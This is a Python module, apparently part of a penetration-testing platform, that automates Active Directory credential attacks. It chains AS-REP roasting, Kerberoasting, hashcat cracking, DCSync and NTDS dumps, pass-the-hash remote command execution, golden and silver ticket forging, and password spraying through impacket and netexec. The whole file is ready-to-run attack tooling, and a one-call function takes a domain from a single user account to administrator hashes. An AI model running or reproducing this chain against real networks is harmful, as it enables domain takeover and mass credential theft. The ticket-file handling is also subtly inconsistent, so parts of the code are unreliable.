"""
凭证攻击模块 v1.0 — Credential Attack Engine
───────────────────────────────────────────
覆盖:
  • AS-REP Roasting (无需凭据)
  • Kerberoasting (域用户凭据)
  • Pass-the-Hash / Pass-the-Ticket
  • Golden Ticket / Silver Ticket
  • DCSync (域控权限)
  • NTDS.dump (域控完整提取)
  • SAM/SYSTEM dump (本地)
  • LSASS dump (mimikatz)
  • 密码喷射 (Password Spray)
  • hashcat/john 自动调度

工具依赖: impacket, netexec, mimikatz, hashcat, john, kerbrute, certipy

用法:
  from .credential_attack import CredentialAttack

  ca = CredentialAttack(project_id=5)

  # AS-REP Roasting
  hashes = ca.asrep_roast("corp.local", dc_ip="10.0.1.10")

  # Kerberoasting
  tickets = ca.kerberoast("corp.local", "user", "pass", dc_ip="10.0.1.10")

  # Pass-the-Hash
  ca.pth("10.0.1.10", "Administrator", nt_hash="aad3b435...")

  # DCSync
  ca.dcsync("corp.local", "dc01", "Administrator", "pass")

  # 一键全流程
  report = ca.full_credential_attack("corp.local", "10.0.1.10", ("user","pass"))
"""

import subprocess, json, time, os, re, tempfile
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Callable, Tuple

from . import db

TMP = Path("/tmp/credential_attack")
TMP.mkdir(exist_ok=True)

# ==================== 数据模型 ====================

@dataclass
class HashEntry:
    """凭证条目"""
    username: str
    hash_type: str               # ntlm/kerberos/aes256/lm/cleartext
    hash_value: str
    domain: str = ""
    source: str = ""             # asrep/kerberoast/dcsync/sam/lsass
    cracked_password: str = ""
    is_cracked: bool = False
    is_admin: bool = False

@dataclass
class TicketInfo:
    """Kerberos票据"""
    username: str
    service: str                 # 服务名 (krbtgt/MSSQLSvc/CIFS等)
    domain: str
    encryption: str              # rc4_hmac/aes256
    ticket_hash: str             # john/hashcat格式
    ticket_file: str = ""        # ccache/kirbi文件路径
    is_golden: bool = False

@dataclass
class CrackResult:
    """爆破结果"""
    hash_entry: HashEntry
    cracked: bool
    password: str
    method: str                  # wordlist/rule/bruteforce/mask
    elapsed: float
    attempts: int

@dataclass
class CredentialReport:
    """凭证攻击完整报告"""
    target: str
    domain: str
    asrep_hashes: List[HashEntry] = field(default_factory=list)
    kerberoast_tickets: List[TicketInfo] = field(default_factory=list)
    dcsync_hashes: List[HashEntry] = field(default_factory=list)
    dumped_hashes: List[HashEntry] = field(default_factory=list)
    cracked_passwords: List[CrackResult] = field(default_factory=list)
    summary: str = ""


# ==================== 核心引擎 ====================

class CredentialAttack:
    """
    凭证攻击引擎 — Kerberos全家桶 + Hash攻击
    
    攻击链:
      AS-REP → Kerberoast → DCSync → Crack → PTH/PTK → Golden Ticket
    """

    def __init__(self, project_id: int, uid: int = 0,
                 callback: Optional[Callable] = None):
        self.project_id = project_id
        self.uid = uid
        self.cb = callback or (lambda *a: None)
        self._cracked: Dict[str, str] = {}  # hash → password

    def _step(self, tool: str, target: str, status: str, msg: str = ""):
        self.cb(tool, target, status, msg)
        if status == "running":
            db.scan_start(self.project_id, self.uid, tool, target)

    def _run(self, cmd: str, timeout: int = 120) -> str:
        try:
            p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return (p.stdout or "") + (p.stderr or "")
        except subprocess.TimeoutExpired:
            return "[超时]"
        except Exception as e:
            return f"[错误: {e}]"

    # ==================== AS-REP Roasting ====================

    def asrep_roast(self, domain: str, dc_ip: str = "",
                    userlist: str = "", output_file: str = "") -> List[HashEntry]:
        """
        AS-REP Roasting — 无需凭据，针对不要求预认证的用户
        
        Args:
            domain: 域名
            dc_ip: 域控IP
            userlist: 用户名列表文件（可选，默认用netexec枚举）
            output_file: 输出hash文件路径
        """
        self._step("asrep-roast", domain, "running", "AS-REP Roasting...")

        hashes = []
        dc_param = f"-dc-ip {dc_ip}" if dc_ip else ""

        # 方法1: 已知用户列表
        if userlist:
            cmd = f"impacket-GetNPUsers {domain}/ -usersfile {userlist} -format hashcat {dc_param} -outputfile {output_file or TMP/'asrep.hashes'} 2>&1"
            out = self._run(cmd, timeout=180)
            hashes = self._parse_asrep_output(out)

        # 方法2: netexec 枚举 + 自动roast
        if not hashes and dc_ip:
            cmd = f"netexec ldap {dc_ip} -d {domain} --asreproast {TMP}/asrep.hashes 2>/dev/null"
            out = self._run(cmd, timeout=180)
            hashes = self._parse_netexec_hashes(out, "asrep")

        if not hashes:
            # 方法3: kerbrute 枚举用户名
            self._step("asrep-roast", domain, "running", "kerbrute枚举用户名...")
            # 使用常见用户名列表
            userlist_cmd = f"echo 'Administrator\nadmin\nsvc_backup\nsqlservice\nkrbtgt' > {TMP}/users.txt"
            self._run(userlist_cmd)
            cmd = f"impacket-GetNPUsers {domain}/ -usersfile {TMP}/users.txt -format hashcat {dc_param} -outputfile {TMP}/asrep.hashes 2>&1"
            out = self._run(cmd, timeout=180)
            hashes = self._parse_asrep_output(out)

        self._step("asrep-roast", domain, "done", f"获取 {len(hashes)} 个AS-REP hash")
        return hashes

    def _parse_asrep_output(self, output: str) -> List[HashEntry]:
        hashes = []
        # 解析 impacket GetNPUsers 输出
        for line in output.split("\n"):
            if "$krb5asrep$" in line and ":" in line:
                parts = line.strip().split(":")
                username = parts[0] if parts else "unknown"
                hash_val = parts[-1] if len(parts) > 1 else line.strip()
                hashes.append(HashEntry(
                    username=username,
                    hash_type="kerberos",
                    hash_value=hash_val,
                    source="asrep"
                ))
        return hashes

    def _parse_netexec_hashes(self, output: str, method: str) -> List[HashEntry]:
        hashes = []
        for line in output.split("\n"):
            if "$krb5asrep$" in line or "$krb5tgs$" in line:
                hashes.append(HashEntry(
                    username="unknown",
                    hash_type="kerberos",
                    hash_value=line.strip(),
                    source=method
                ))
        return hashes

    # ==================== Kerberoasting ====================

    def kerberoast(self, domain: str, username: str, password: str,
                   dc_ip: str = "", output_file: str = "") -> List[TicketInfo]:
        """
        Kerberoasting — 需要域用户凭据，请求服务票据
        
        Args:
            domain: 域名
            username/password: 域用户凭据
            dc_ip: 域控IP
            output_file: 输出文件
        """
        self._step("kerberoast", domain, "running", f"用户: {username}")

        tickets = []
        dc_param = f"-dc-ip {dc_ip}" if dc_ip else ""
        out_file = output_file or f"{TMP}/kerberoast_{domain}.hashes"

        # impacket GetUserSPNs
        cmd = (f"impacket-GetUserSPNs {domain}/{username}:'{password}' "
               f"{dc_param} -request -outputfile {out_file} 2>&1")
        out = self._run(cmd, timeout=180)

        # 解析票据
        for line in out.split("\n"):
            if "$krb5tgs$" in line:
                # 尝试提取服务名
                service = "unknown"
                for svc in ["MSSQLSvc", "CIFS", "HTTP", "HOST", "LDAP", "krbtgt"]:
                    if svc in line:
                        service = svc
                        break
                tickets.append(TicketInfo(
                    username=username,
                    service=service,
                    domain=domain,
                    encryption="rc4_hmac" if "23$" in line else "aes256",
                    ticket_hash=line.strip()
                ))
            elif "ServicePrincipalName" in line:
                pass  # 可用于提取服务名

        # 也用 netexec 做一次
        if dc_ip:
            cmd2 = f"netexec ldap {dc_ip} -d {domain} -u '{username}' -p '{password}' --kerberoasting {TMP}/kerberoast2.hashes 2>/dev/null"
            self._run(cmd2, timeout=120)
            # 合并结果
            merged = self._load_hash_file(f"{TMP}/kerberoast2.hashes")
            for h in merged:
                if not any(t.ticket_hash == h for t in tickets):
                    svc = "unknown"
                    for s in ["MSSQLSvc", "CIFS", "HTTP", "HOST", "LDAP"]:
                        if s in h: svc = s; break
                    tickets.append(TicketInfo(
                        username=username, service=svc, domain=domain,
                        encryption="rc4_hmac", ticket_hash=h
                    ))

        self._step("kerberoast", domain, "done", f"获取 {len(tickets)} 个服务票据")
        return tickets

    def _load_hash_file(self, path: str) -> List[str]:
        """加载hash文件"""
        try:
            return [l.strip() for l in Path(path).read_text().split("\n") if l.strip()]
        except Exception:
            return []

    # ==================== Pass-the-Hash ====================

    def pth(self, target: str, username: str, nt_hash: str,
            domain: str = "", command: str = "whoami") -> Dict[str, Any]:
        """
        Pass-the-Hash
        
        Args:
            target: 目标IP
            username: 用户名
            nt_hash: NTLM hash (LM:NT格式或纯NT)
            domain: 域名
            command: 要执行的命令
        """
        self._step("pth", target, "running", f"用户: {username}")

        # 处理hash格式
        if ":" in nt_hash and len(nt_hash) > 40:
            nt_hash = nt_hash.split(":")[-1]  # 取NT部分

        domain_part = f"{domain}/" if domain else ""

        # 尝试多种方法
        methods = [
            # wmiexec
            f"impacket-wmiexec -hashes :{nt_hash} {domain_part}{username}@{target} '{command}' 2>&1",
            # psexec
            f"impacket-psexec -hashes :{nt_hash} {domain_part}{username}@{target} '{command}' 2>&1",
            # smbexec
            f"impacket-smbexec -hashes :{nt_hash} {domain_part}{username}@{target} '{command}' 2>&1",
        ]

        result = {"success": False, "method": "", "output": ""}
        for method_cmd in methods:
            out = self._run(method_cmd, timeout=30)
            if "nt authority" in out.lower() or "administrator" in out.lower() or "error" not in out.lower():
                result = {"success": True, "method": method_cmd.split()[0].split("/")[-1],
                         "output": out[:1000]}
                break
            result["output"] = out[:500]

        self._step("pth", target, "done", "✅" if result["success"] else "❌")
        return result

    # ==================== DCSync ====================

    def dcsync(self, domain: str, dc_host: str, username: str,
               password: str = "", nt_hash: str = "",
               target_user: str = "Administrator") -> List[HashEntry]:
        """
        DCSync — 模拟域控同步，需要域管/域控权限
        
        Args:
            domain: 域名
            dc_host: 域控主机名或IP
            username: 有DCSync权限的用户
            password: 密码
            nt_hash: NTLM hash (可选)
            target_user: 目标用户 (默认Administrator, 可用'all'获取所有)
        """
        self._step("dcsync", domain, "running", f"目标: {target_user}")

        hashes = []
        auth = f"{domain}/{username}:'{password}'" if password else f"{domain}/{username} -hashes :{nt_hash}"
        user_target = target_user if target_user != "all" else ""

        if user_target:
            cmd = f"impacket-secretsdump {auth}@{dc_host} -just-dc-user {user_target} 2>&1"
        else:
            cmd = f"impacket-secretsdump {auth}@{dc_host} 2>&1"

        out = self._run(cmd, timeout=120)

        # 解析输出
        for line in out.split("\n"):
            line = line.strip()
            if ":" in line and len(line.split(":")[-1]) == 32:
                # NTLM hash格式
                parts = line.split(":")
                if len(parts) >= 4 and all(c in "0123456789abcdefABCDEF" for c in parts[-1]):
                    uname = parts[0]
                    ntlm = parts[-1]
                    hashes.append(HashEntry(
                        username=uname,
                        hash_type="ntlm",
                        hash_value=ntlm,
                        domain=domain,
                        source="dcsync",
                        is_admin=uname.lower() in ("administrator", "krbtgt", "domain admins")
                    ))
            elif "aes256-cts-hmac-sha1" in line:
                parts = line.split(":")
                uname = parts[0] if parts else "unknown"
                # AES key
                aes_key = parts[-1].strip() if parts else ""
                if len(aes_key) == 64:
                    hashes.append(HashEntry(
                        username=uname,
                        hash_type="aes256",
                        hash_value=aes_key,
                        domain=domain,
                        source="dcsync"
                    ))

        self._step("dcsync", domain, "done", f"获取 {len(hashes)} 个hash")
        return hashes

    # ==================== NTDS.dump ====================

    def ntds_dump(self, target: str, username: str, password: str = "",
                  nt_hash: str = "", domain: str = "") -> List[HashEntry]:
        """
        完整NTDS.dit dump — 需要域控本地管理员权限
        
        Args:
            target: 域控IP
            username: 管理员
            password: 密码
            nt_hash: NTLM hash
            domain: 域名
        """
        self._step("ntds-dump", target, "running", "完整NTDS.dit导出...")

        hashes = []
        auth = f"{domain}/{username}:'{password}'" if password else f"{domain}/{username} -hashes :{nt_hash}"
        outfile = TMP / f"ntds_{target}_{int(time.time())}"

        # impacket-secretsdump 完整导出
        cmd = f"impacket-secretsdump {auth}@{target} -outputfile {outfile} 2>&1"
        out = self._run(cmd, timeout=600)

        # 解析NTDS输出
        ntds_file = Path(f"{outfile}.ntds")
        if ntds_file.exists():
            for line in ntds_file.read_text().split("\n"):
                if ":" in line:
                    parts = line.strip().split(":")
                    if len(parts) >= 4 and len(parts[-1]) == 32:
                        hashes.append(HashEntry(
                            username=parts[0],
                            hash_type="ntlm",
                            hash_value=parts[-1],
                            domain=domain,
                            source="ntds"
                        ))

        self._step("ntds-dump", target, "done", f"导出 {len(hashes)} 个hash")
        return hashes

    # ==================== Golden Ticket ====================

    def golden_ticket(self, domain: str, krbtgt_hash: str, domain_sid: str,
                      username: str = "Administrator",
                      target_user: str = "fakeadmin") -> Tuple[bool, str]:
        """
        生成Golden Ticket
        
        Args:
            domain: 域名 (FQDN)
            krbtgt_hash: krbtgt账户的NTLM hash
            domain_sid: 域SID
            username: 用于生成ticket的用户
            target_user: 伪造的用户名
        """
        self._step("golden-ticket", domain, "running", "生成Golden Ticket...")

        ticket_file = TMP / f"golden_{domain}_{int(time.time())}.ccache"
        cmd = (
            f"impacket-ticketer -nthash {krbtgt_hash} "
            f"-domain-sid {domain_sid} -domain {domain} "
            f"-user-id 500 {target_user} 2>&1"
        )
        out = self._run(cmd, timeout=60)

        success = "saved to" in out.lower() and ticket_file.exists()

        self._step("golden-ticket", domain, "done", "✅" if success else "❌")
        return (success, str(ticket_file) if success else out[:200])

    def silver_ticket(self, domain: str, service_hash: str, domain_sid: str,
                      service: str = "CIFS", target: str = "",
                      username: str = "Administrator") -> Tuple[bool, str]:
        """
        生成Silver Ticket — 针对特定服务
        
        Args:
            domain: 域名
            service_hash: 服务账户的NTLM hash
            domain_sid: 域SID
            service: 目标服务 (CIFS/HOST/HTTP/MSSQLSvc等)
            target: 目标主机
            username: 伪造的用户名
        """
        self._step("silver-ticket", domain, "running", f"服务: {service}")

        target_param = f"-target {target}" if target else ""
        cmd = (
            f"impacket-ticketer -nthash {service_hash} "
            f"-domain-sid {domain_sid} -domain {domain} "
            f"-spn {service}/{target or '*'} {target_param} "
            f"-user-id 500 {username} 2>&1"
        )
        out = self._run(cmd, timeout=60)

        ticket_file = TMP / f"silver_{service}_{int(time.time())}.ccache"
        success = "saved to" in out.lower()

        self._step("silver-ticket", domain, "done", "✅" if success else "❌")
        return (success, str(ticket_file) if success else out[:200])

    # ==================== 密码爆破 ====================

    def password_spray(self, target: str, domain: str, userlist: List[str],
                       password: str, protocol: str = "smb") -> Dict[str, Any]:
        """
        密码喷射 — 一个密码尝试所有用户
        
        Args:
            target: DC IP
            domain: 域名
            userlist: 用户名列表
            password: 要尝试的密码
            protocol: smb/ldap/winrm/kerberos
        """
        self._step("spray", target, "running", f"密码: {password[:3]}***")

        # 用netexec做密码喷射
        users_file = TMP / f"spray_users_{int(time.time())}.txt"
        users_file.write_text("\n".join(userlist))

        cmd = (f"netexec {protocol} {target} -d {domain} "
               f"-u {users_file} -p '{password}' --continue-on-success 2>/dev/null")
        out = self._run(cmd, timeout=300)

        # 解析成功结果
        valid_users = []
        for line in out.split("\n"):
            if "[+]" in line or "Pwn3d!" in line:
                valid_users.append(line.strip()[:100])

        self._step("spray", target, "done", f"有效: {len(valid_users)}")
        return {"valid_users": valid_users, "total_attempted": len(userlist)}

    def crack_hashes(self, hashes: List[HashEntry], wordlist: str = "/usr/share/wordlists/rockyou.txt",
                     rules: str = "best64.rule", mode: str = "auto") -> List[CrackResult]:
        """
        自动调用hashcat/john爆破hash
        
        Args:
            hashes: hash列表
            wordlist: 字典路径
            rules: hashcat规则
            mode: hashcat/john/auto
        """
        results = []

        for h in hashes:
            if h.is_cracked:
                continue

            self._step("crack", h.username, "running", f"类型: {h.hash_type}")

            hash_file = TMP / f"hash_{h.username}_{int(time.time())}.txt"
            hash_file.write_text(h.hash_value)

            start = time.time()

            # hashcat尝试
            hashcat_mode = self._detect_hashcat_mode(h.hash_type)
            cmd = (f"hashcat -m {hashcat_mode} -a 0 -r {rules} "
                   f"{hash_file} {wordlist} --potfile-disable -O --force 2>&1")
            out = self._run(cmd, timeout=300)

            # 检查是否破解
            cracked = False
            password = ""

            # 检查potfile
            show_cmd = f"hashcat -m {hashcat_mode} --show {hash_file} 2>&1"
            show_out = self._run(show_cmd, timeout=10)
            if ":" in show_out and hash_file.read_text().strip()[:20] in show_out:
                parts = show_out.strip().split(":")
                if len(parts) >= 2:
                    password = parts[-1]
                    cracked = True
                    h.cracked_password = password
                    h.is_cracked = True
                    self._cracked[h.hash_value] = password

            results.append(CrackResult(
                hash_entry=h,
                cracked=cracked,
                password=password,
                method="hashcat+wordlist",
                elapsed=time.time() - start,
                attempts=0
            ))

            status = f"✅ {password}" if cracked else "❌"
            self._step("crack", h.username, "done", status)

        return results

    def _detect_hashcat_mode(self, hash_type: str) -> str:
        """检测hashcat模式"""
        modes = {
            "ntlm": "1000",
            "kerberos": "18200",
            "aes256": "19600",
            "lm": "3000",
            "cleartext": "0",
        }
        return modes.get(hash_type, "1000")

    # ==================== 一键全流程 ====================

    def full_credential_attack(self, domain: str, dc_ip: str,
                                credential: Tuple[str, str] = ("", ""),
                                wordlist: str = "/usr/share/wordlists/rockyou.txt"
                                ) -> CredentialReport:
        """
        一键凭证攻击全流程:
        AS-REP → Kerberoast → Crack → DCSync(如有权限) → PTH
        
        Returns:
            CredentialReport 完整报告
        """
        report = CredentialReport(target=dc_ip, domain=domain)
        username, password = credential

        # 阶段1: AS-REP Roasting (无需凭据)
        report.asrep_hashes = self.asrep_roast(domain, dc_ip)

        # 阶段2: Kerberoasting (如果有凭据)
        if username and password:
            tickets = self.kerberoast(domain, username, password, dc_ip)
            report.kerberoast_tickets = tickets

            # 转换ticket hash为HashEntry用于爆破
            tgs_hashes = []
            for t in tickets:
                tgs_hashes.append(HashEntry(
                    username=t.service,
                    hash_type="kerberos",
                    hash_value=t.ticket_hash,
                    domain=domain,
                    source="kerberoast"
                ))

            # 阶段3: 爆破hash
            all_hashes = report.asrep_hashes + tgs_hashes
            if all_hashes:
                report.cracked_passwords = self.crack_hashes(all_hashes, wordlist)

            # 阶段4: 尝试DCSync (如果有高权限)
            dcsync_hashes = self.dcsync(domain, dc_ip, username, password)
            report.dcsync_hashes = dcsync_hashes

            # 阶段5: 对获取的高权限hash做PTH验证
            for h in dcsync_hashes:
                if h.username.lower() == "administrator":
                    pth_result = self.pth(dc_ip, h.username, h.hash_value, domain)
                    if pth_result["success"]:
                        report.summary += f"✅ PTH成功: {h.username}@{dc_ip}\n"

        # 生成摘要
        report.summary = (
            f"凭证攻击报告\n"
            f"{'─'*50}\n"
            f"域: {domain}\n"
            f"域控: {dc_ip}\n"
            f"AS-REP hash: {len(report.asrep_hashes)}\n"
            f"Kerberoast票据: {len(report.kerberoast_tickets)}\n"
            f"DCSync hash: {len(report.dcsync_hashes)}\n"
            f"破解成功: {sum(1 for c in report.cracked_passwords if c.cracked)}\n"
            f"{report.summary}"
        )

        self._step("credential-full", domain, "done", f"完成凭证攻击")
        return report
